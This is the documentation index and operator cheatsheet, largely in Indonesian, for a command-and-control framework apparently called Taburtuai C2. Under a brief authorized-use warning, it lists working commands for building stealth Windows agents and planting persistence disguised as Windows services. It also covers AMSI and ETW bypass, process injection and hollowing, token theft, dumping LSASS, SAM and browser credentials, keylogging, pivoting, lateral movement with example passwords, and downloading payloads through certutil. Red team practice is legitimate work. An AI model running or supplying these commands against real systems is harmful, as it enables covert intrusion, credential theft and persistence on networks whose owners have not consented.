# Taburtuai C2 — Dokumentasi Lengkap

> **PERINGATAN:** Framework ini hanya boleh digunakan untuk **authorized security testing**,
> red team engagement dengan izin tertulis, dan penelitian keamanan defensif.
> Penggunaan tanpa izin adalah tindakan ilegal.

---

## Daftar Isi

| # | Halaman | Topik Utama |
|---|---------|-------------|
| [01](01-introduction.md) | Introduction | Arsitektur, komponen, model threat, flow komunikasi |
| [02](02-setup.md) | Setup & Instalasi | Prerequisites, build, konfigurasi server, HTTPS |
| [03](03-quickstart.md) | Quickstart | Dari nol ke agent aktif, 10 langkah end-to-end |
| [04](04-agents.md) | Agent Management | List, inspect, delete, filter, beacon interval |
| [05](05-execution.md) | Command Execution | Shell, interactive, working dir, timeout, methods |
| [06](06-files.md) | File Operations | Upload, download, list, delete, ADS write |
| [07](07-persistence.md) | Persistence | Registry, scheduled task, service, startup folder |
| [08](08-process.md) | Process Management | List, kill, start, PPID spoofing |
| [09](09-stager.md) | Stager & Delivery | Stage upload, token, format stager, delivery methods |
| [10](10-injection.md) | Process Injection | CRT, APC, hollowing, hijack, stomp, mapinject |
| [11](11-evasion.md) | Evasion & Bypass | AMSI, ETW, unhook, sleep masking, HWBP, token |
| [12](12-credentials.md) | Credential Access | LSASS, SAM, browser, clipboard |
| [13](13-recon.md) | Reconnaissance | Screenshot, keylogger, token enumeration |
| [14](14-network.md) | Network & Pivoting | Port scan, ARP scan, SOCKS5 proxy, Port forwarding |
| [15](15-advanced.md) | Advanced Techniques | BOF, registry ops, OPSEC timegate, anti-analysis |
| [16](16-scenarios.md) | Red Team Scenarios | Skenario engagement end-to-end |
| [17](17-profiles.md) | Malleable Profiles | HTTP traffic camouflage (office365, cdn, slack) |
| [18](18-opsec-hardening.md) | OPSEC Hardening | String encryption, Authenticode signing |
| [19](19-advanced-transports.md) | Advanced Transports | WebSocket, DNS, DoH, ICMP, SMB, cert pinning |
| [20](20-teamserver.md) | Team Server | Multi-operator, claiming, SSE event stream |
| [21](21-opsec-playbook.md) | OPSEC Playbook | Operator playbook: initial intrusion → exfiltration |
| [22](22-lateral-movement.md) | Lateral Movement | WMI, WinRM, Schtask, Service exec via agent pivot |

---

## Cheatsheet Operator

```bash
# ─── SERVER ─────────────────────────────────────────────────────────────────
ENCRYPTION_KEY=K3yRah4sia ./bin/server --port 8080

# HTTPS built-in (self-signed cert otomatis)
ENCRYPTION_KEY=K3yRah4sia ./bin/server --tls --port 8080 --tls-port 8443

# HTTPS dengan cert custom
ENCRYPTION_KEY=K3yRah4sia ./bin/server --tls --tls-cert server.crt --tls-key server.key --tls-port 443

# HTTPS via env vars
TLS_ENABLED=true TLS_PORT=8443 ENCRYPTION_KEY=K3yRah4sia ./bin/server

# WebSocket listener (push commands, low latency)
ENCRYPTION_KEY=K3yRah4sia ./bin/server --ws --ws-port 8081

# DNS authoritative listener (UDP, butuh --dns-domain)
ENCRYPTION_KEY=K3yRah4sia ./bin/server --dns --dns-domain c2.yourdomain.com --dns-port 5353

# HTTPS + WS + DNS sekaligus
ENCRYPTION_KEY=K3yRah4sia ./bin/server --tls --tls-port 8443 --ws --ws-port 8081 \
  --dns --dns-domain c2.yourdomain.com

# HTTPS + WS sekaligus
ENCRYPTION_KEY=K3yRah4sia ./bin/server --tls --tls-port 8443 --ws --ws-port 8081

# ─── BUILD AGENT ────────────────────────────────────────────────────────────
make agent-win-stealth C2_SERVER=https://c2.corp.local:8000 ENC_KEY=K3yRah4sia INTERVAL=60 JITTER=25
make agent-win-stealth C2_SERVER=https://IP:8443 ENC_KEY=K3yRah4sia CERT_PIN=aabb...  # TLS cert pinning
make agent-win-doh     C2_SERVER=example.com ENC_KEY=K3yRah4sia TRANSPORT=doh
make agent-win-smb     SMB_RELAY=10.10.5.3   ENC_KEY=K3yRah4sia TRANSPORT=smb
make agent-win-ws      C2_SERVER=http://IP:8080 ENC_KEY=K3yRah4sia TRANSPORT=ws        # WS push, latensi <1s
make agent-win-dns     C2_SERVER=http://IP:8080 ENC_KEY=K3yRah4sia TRANSPORT=dns \
                       DNS_DOMAIN=c2.yourdomain.com DNS_SERVER=IP:5353                 # DNS covert channel

# ─── OPERATOR CONSOLE ───────────────────────────────────────────────────────
./bin/operator console --server http://IP:8000

# ─── AGENT MANAGEMENT ───────────────────────────────────────────────────────
agents list
agents list --status online
agents info <id>
agents delete <id>

# ─── COMMAND EXECUTION ──────────────────────────────────────────────────────
cmd    <id> "whoami /priv"
shell  <id>                        # interactive shell
cmd    <id> "powershell Get-Process" --method powershell --timeout 60 --wait

# ─── FILE OPS ───────────────────────────────────────────────────────────────
files upload   <id> /local/tool.exe "C:\Temp\tool.exe"
files download <id> "C:\Users\user\Documents\loot.xlsx" ./loot.xlsx
files list     <id> "C:\Users\user\Desktop"
files delete   <id> "C:\Temp\tool.exe"

# ─── PERSISTENCE ────────────────────────────────────────────────────────────
persistence setup  <id> --method registry_run   --name "WindowsUpdate"
persistence setup  <id> --method schtask        --name "SyncTask" --trigger logon
persistence setup  <id> --method service        --name "WinDefSvc"
persistence setup  <id> --method startup_folder --name "Updater"
persistence list   <id>
persistence remove <id> --method registry_run --name "WindowsUpdate"

# ─── PROCESS ────────────────────────────────────────────────────────────────
process list  <id>
process kill  <id> --pid 4512
process start <id> --path "C:\Windows\System32\cmd.exe" --args "/c whoami" --hidden

# ─── EVASION ────────────────────────────────────────────────────────────────
bypass amsi   <id> [--pid <pid>]
bypass etw    <id> [--pid <pid>]
evasion unhook   <id>
evasion sleep    <id> --duration 30
evasion hwbp set <id> --addr 0x7FFE1234 --register 0

# ─── TOKEN ──────────────────────────────────────────────────────────────────
token list   <id>
token steal  <id> --pid 724
token make   <id> --user john --domain CORP --pass "P@ss"
token runas  <id> --pid 724 --exe "cmd.exe" --args "/c whoami"
token revert <id>

# ─── INJECTION ──────────────────────────────────────────────────────────────
inject remote <id> --pid 3048 --file payload.bin --method crt
inject remote <id> --pid 3048 --file payload.bin --method apc
inject self   <id> --file payload.bin
inject ppid   <id> --exe "cmd.exe" --ppid-name explorer.exe
hollow        <id> --file payload.bin [--exe svchost.exe]   # auto-detect: PE atau shellcode
hijack        <id> --pid 3048 --file payload.bin
stomp         <id> --file payload.bin --dll xpsservices.dll
mapinject     <id> --file payload.bin [--pid 3048]

# ─── CREDENTIALS ────────────────────────────────────────────────────────────
creds lsass    <id> [--output C:\Temp\lsass.dmp]
creds sam      <id> [--output-dir C:\Temp]             # auto-fallback ke VSS jika SeBackupPriv tidak ada
creds browser  <id>
creds clipboard <id>

# ─── RECON ──────────────────────────────────────────────────────────────────
screenshot <id>
keylog start <id> [--duration 60] [--wait]
keylog dump  <id> [--wait] [--timeout 60]   # --wait default true; increase --timeout if beacon interval > 60s
keylog stop  <id> [--wait] [--timeout 60]
keylog clear <id>

# ─── NETWORK & PIVOT ────────────────────────────────────────────────────────
netscan  <id> --targets 192.168.1.0/24 --ports 22,80,443,3389 --scan-timeout 2 --wait
# NOTE: --scan-timeout = per-connection timeout (seconds); --timeout = operator wait timeout (default 300s)
arpscan  <id> --wait
socks5 start <id> [--addr 127.0.0.1:1080] --wait
socks5 stop  <id>

# ─── PORT FORWARDING ─────────────────────────────────────────────────────────
portfwd start <id> 192.168.1.10:3389 --local-port 33899   # buat tunnel RDP
portfwd list                                               # lihat session aktif
portfwd stop fwd-1                                         # hapus session
# Setelah agent eksekusi (1 beacon interval):
xfreerdp /v:localhost:33899 /u:CORP\\john.doe /p:'P@ss'

# ─── LATERAL MOVEMENT ────────────────────────────────────────────────────────
# WMI (fire-and-forget, tidak butuh WinRM)
lateral wmi  <id> DC01   "cmd /c whoami > C:\Temp\o.txt" --user admin --domain CORP --pass 'P@ss'
# WinRM (output di-capture, butuh PSRemoting enabled di target)
lateral winrm <id> FS01  "hostname; net user" --user admin --domain CORP --pass 'P@ss' --wait
# Scheduled Task remote (berguna jika WMI diblokir)
lateral schtask <id> 192.168.1.50 "powershell -enc <B64>" --user admin --domain CORP --pass 'P@ss'
# Service exec (seperti PsExec, paling noisy)
lateral service <id> 192.168.1.100 "C:\Temp\payload.exe"

# ─── REGISTRY ───────────────────────────────────────────────────────────────
registry read   <id> --hive HKLM --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" --value ProductName --wait
registry write  <id> --hive HKCU --key "Software\Test" --value MyVal --data hello --type sz --wait
registry delete <id> --hive HKCU --key "Software\Test" --value MyVal --wait
registry list   <id> --hive HKLM --key "SOFTWARE\Microsoft" --wait

# ─── ADVANCED ───────────────────────────────────────────────────────────────
bof      <id> dir.o [--args-file packed_args.bin] --wait   # positional: <agent-id> <coff.o>
opsec antidebug <id> --wait
opsec antivm    <id> --wait
opsec timegate  <id> --work-start 8 --work-end 18 --kill-date 2026-12-31
fetch    <id> http://10.10.5.3/tool.exe "C:\Temp\t.exe" --method certutil --wait
# NOTE: command is "fetch", NOT "lolbin fetch"; takes 3 positional args: <agent-id> <url> <remote-path>
ads exec <id> "C:\legit.txt:payload.js" --wait
# OR: ads exec <id> --ads-path "C:\legit.txt:payload.js" --wait

# ─── TEAM SERVER ────────────────────────────────────────────────────────────
team operators
team subscribe alice --server http://IP:8000              # SSE stream (positional operator name)
team claim   <id> --session S --server http://IP:8000
team release <id> --session S --server http://IP:8000
```

---

## Konvensi Dokumen

| Token | Arti |
|-------|------|
| `<id>` | Agent ID lengkap atau prefix 8 karakter |
| `<cmd-id>` | Command ID dari output antrean |
| `KEY` | Nilai `ENCRYPTION_KEY` yang identik di server dan agent |
| `IP:PORT` | Alamat C2 server yang dapat diakses dari internet |
| `--wait` | Tunggu hasil sebelum lanjut (opsional, blocking) |
| `[...]` | Parameter opsional |

---

*Taburtuai C2 — For authorized security testing only.*
